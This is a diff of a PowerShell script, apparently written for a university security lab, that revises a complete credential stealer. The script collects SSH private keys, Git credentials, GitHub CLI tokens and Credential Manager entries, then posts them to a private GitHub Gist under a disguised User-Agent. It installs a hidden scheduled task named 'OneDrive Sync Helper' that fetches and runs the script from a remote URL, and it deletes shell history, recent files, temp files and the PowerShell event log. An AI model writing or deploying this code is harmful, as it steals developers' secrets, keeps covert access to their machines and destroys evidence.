@@ -4,148 +4,118 @@
 #  System Security Lab SS2026 – AAU Klagenfurt
 #
 #  Ablauf:
-#    1. Recon  – SSH-Keys, Git-Credentials, GitHub-CLI Token
-#    2. Exfil  – Privates GitHub Gist (HTTPS → nie geblockt)
-#    3. Persist – Versteckter Scheduled Task
-#    4. OPSEC  – PS-History, Temp-Dateien, Recent Files löschen
+#    1. Recon   – SSH-Keys, Git-Credentials, GitHub-CLI Token
+#    2. Exfil   – Privates GitHub Gist (HTTPS → nie geblockt)
+#    3. Persist  – Versteckter Scheduled Task lädt dieses Script
+#                  erneut von GitHub Gist (kein lokaler Server)
+#    4. OPSEC   – PS-History, Temp-Dateien, Recent Files löschen
 #
-#  Voraussetzung: GitHub Personal Access Token mit "gist"-Scope
-#  Ersetze GITHUB_PAT und ATTACKER_URL!
+#  Setup:
+#    1. GitHub PAT mit "gist"-Scope erstellen
+#    2. GITHUB_PAT und PERSIST_GIST_RAW_URL unten eintragen
+#       (PERSIST_GIST_RAW_URL = Raw-URL dieses Scripts auf Gist)
 # ============================================================
 
-$GITHUB_PAT   = "GITHUB_PAT_HERE"        # PAT mit gist-Scope
-$ATTACKER_URL = "http://ATTACKER_IP:8080/payload.ps1"  # für Persistenz
+$GITHUB_PAT          = "GITHUB_PAT_HERE"
+$PERSIST_GIST_RAW_URL = "GIST_RAW_URL"   # Raw-URL dieses Scripts für Scheduled Task
 
 # ── PHASE 1: RECON ──────────────────────────────────────────
 
 $report = [System.Text.StringBuilder]::new()
-$null = $report.AppendLine("=== DevRecon Report | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
-$null = $report.AppendLine("Host : $env:COMPUTERNAME | User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)")
+$null = $report.AppendLine("=== DevRecon | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
+$null = $report.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)")
 $null = $report.AppendLine("")
 
-# 1a) SSH Private Keys (~/.ssh)
-$null = $report.AppendLine("── SSH PRIVATE KEYS ──────────────────────────────────────")
+# SSH Private Keys
+$null = $report.AppendLine("── SSH KEYS ──────────────────────────────────────────────")
 $sshDir = Join-Path $env:USERPROFILE ".ssh"
 if (Test-Path $sshDir) {
-    # Private Key Dateien: id_rsa, id_ed25519, id_ecdsa, id_dsa, config
     Get-ChildItem $sshDir -File | ForEach-Object {
         $null = $report.AppendLine("[ $($_.Name) ]")
         $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
         $null = $report.AppendLine("")
     }
 } else {
-    $null = $report.AppendLine("(kein .ssh Verzeichnis gefunden)")
+    $null = $report.AppendLine("(kein .ssh Verzeichnis)")
 }
 
-# 1b) Git Credential Store – enthält GitHub-Tokens im Klartext!
-# Datei: ~/.git-credentials  Format: https://user:TOKEN@github.com
-$null = $report.AppendLine("── GIT CREDENTIALS (.git-credentials) ────────────────────")
+# .git-credentials – GitHub-Tokens im Klartext
+$null = $report.AppendLine("── GIT CREDENTIALS ───────────────────────────────────────")
 $gitCreds = Join-Path $env:USERPROFILE ".git-credentials"
 if (Test-Path $gitCreds) {
     $null = $report.AppendLine((Get-Content $gitCreds -Raw))
 } else {
-    $null = $report.AppendLine("(keine .git-credentials Datei gefunden)")
+    $null = $report.AppendLine("(keine .git-credentials)")
 }
 
-# 1c) .gitconfig – Name, E-Mail, Credential Helper, Aliase
-$null = $report.AppendLine("── .GITCONFIG ─────────────────────────────────────────────")
+# .gitconfig
+$null = $report.AppendLine("── .GITCONFIG ────────────────────────────────────────────")
 $gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
 if (Test-Path $gitConfig) {
     $null = $report.AppendLine((Get-Content $gitConfig -Raw))
 } else {
-    $null = $report.AppendLine("(keine .gitconfig gefunden)")
+    $null = $report.AppendLine("(keine .gitconfig)")
 }
 
-# 1d) GitHub CLI Token (gh auth) – gespeichert in hosts.yml
-# Enthält den OAuth-Token für die GitHub API!
-$null = $report.AppendLine("── GITHUB CLI TOKEN (hosts.yml) ───────────────────────────")
+# GitHub CLI Token
+$null = $report.AppendLine("── GITHUB CLI TOKEN ──────────────────────────────────────")
 $ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
-if (-not (Test-Path $ghHosts)) {
-    # Alternativer Pfad (neuere gh-Versionen)
-    $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml"
-}
+if (-not (Test-Path $ghHosts)) { $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml" }
 if (Test-Path $ghHosts) {
     $null = $report.AppendLine((Get-Content $ghHosts -Raw))
 } else {
-    $null = $report.AppendLine("(kein GitHub CLI Token gefunden)")
+    $null = $report.AppendLine("(kein GitHub CLI Token)")
 }
 
-# 1e) Windows Credential Manager – gespeicherte Git-Credentials
-$null = $report.AppendLine("── WINDOWS CREDENTIAL MANAGER (git) ──────────────────────")
-$cmdkeyOutput = cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String
-$null = $report.AppendLine($cmdkeyOutput)
+# Windows Credential Manager
+$null = $report.AppendLine("── CREDENTIAL MANAGER (git) ──────────────────────────────")
+$null = $report.AppendLine((cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String))
 
-# ── PHASE 2: EXFILTRATION via GitHub Gist ───────────────────
-# Privates Gist: nur der Eigentümer des PAT kann es sehen.
-# Traffic geht über api.github.com:443 → sieht aus wie normales
-# GitHub-Browsing, wird von praktisch keiner Firewall geblockt.
-
-$gistBody = @{
-    description = "sync_backup_$(Get-Date -Format 'yyyyMMdd_HHmm')"
-    public      = $false
-    files       = @{
-        "report.txt" = @{ content = $report.ToString() }
-    }
-} | ConvertTo-Json -Depth 5
+# ── PHASE 2: EXFIL via privates GitHub Gist ─────────────────
 
 $headers = @{
     "Authorization" = "token $GITHUB_PAT"
     "Content-Type"  = "application/json"
-    "User-Agent"    = "git/2.40.0"    # User-Agent tarnen als normaler git-Client
+    "User-Agent"    = "git/2.40.0"
 }
+$body = @{
+    description = "sync_$(Get-Date -Format 'yyyyMMdd_HHmm')"
+    public      = $false
+    files       = @{ "report.txt" = @{ content = $report.ToString() } }
+} | ConvertTo-Json -Depth 5
 
 try {
-    $response = Invoke-RestMethod -Uri "https://api.github.com/gists" `
-        -Method POST -Headers $headers -Body $gistBody
-    $gistUrl = $response.html_url
-} catch {
-    # Stilles Scheitern – kein Fehler beim Opfer sichtbar
-    $gistUrl = "exfil_failed"
-}
+    Invoke-RestMethod -Uri "https://api.github.com/gists" `
+        -Method POST -Headers $headers -Body $body | Out-Null
+} catch { }
 
-# ── PHASE 3: PERSISTENZ – Scheduled Task ────────────────────
-# Task-Name: unauffällig, klingt nach Windows-Systemdienst
+# ── PHASE 3: PERSISTENZ – Scheduled Task via Gist ───────────
+# Der Task lädt dieses Script direkt von GitHub Gist –
+# kein lokaler Server, funktioniert über alle Subnetze.
+
 $taskName = "OneDrive Sync Helper"
 
-# Prüfen ob Task schon existiert (Idempotenz)
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-    $action = New-ScheduledTaskAction `
-        -Execute "powershell.exe" `
-        -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('$ATTACKER_URL')`""
+    $cmd = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " +
+           "`"IEX (New-Object Net.WebClient).DownloadString('$PERSIST_GIST_RAW_URL')`""
 
-    # Jeden Montag um 09:15 – Zeitpunkt wenn Mitarbeiter üblicherweise im Büro
-    $trigger  = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
-    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
+    $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
+    $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
     $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
 
-    Register-ScheduledTask `
-        -TaskName  $taskName `
-        -Action    $action `
-        -Trigger   $trigger `
-        -Settings  $settings `
-        -Principal $principal `
-        -ErrorAction SilentlyContinue | Out-Null
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
+        -Settings $settings -Principal $principal -ErrorAction SilentlyContinue | Out-Null
 }
 
-# ── PHASE 4: OPSEC – Spuren verwischen ──────────────────────
+# ── PHASE 4: OPSEC ──────────────────────────────────────────
 
-# PowerShell Befehlshistorie löschen (PSReadLine-Datei)
 $histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
 if ($histFile -and (Test-Path $histFile)) {
     Remove-Item $histFile -Force -ErrorAction SilentlyContinue
 }
-
-# Session-History im Speicher leeren
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
 Clear-History
-
-# Zuletzt verwendete Dateien (Recent Files) clearen
 Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
-
-# Temporäre XML-Dateien (z.B. von netsh-Export) entfernen
 Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\*.txt" -Force -ErrorAction SilentlyContinue
-
-# PowerShell Event Log für diese Session leeren (braucht keine Admin-Rechte für eigene Session)
-# Hinweis: vollständiges Log-Löschen (wevtutil) braucht Admin → weglassen für Standard-User-OPSEC
 [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell") 2>$null
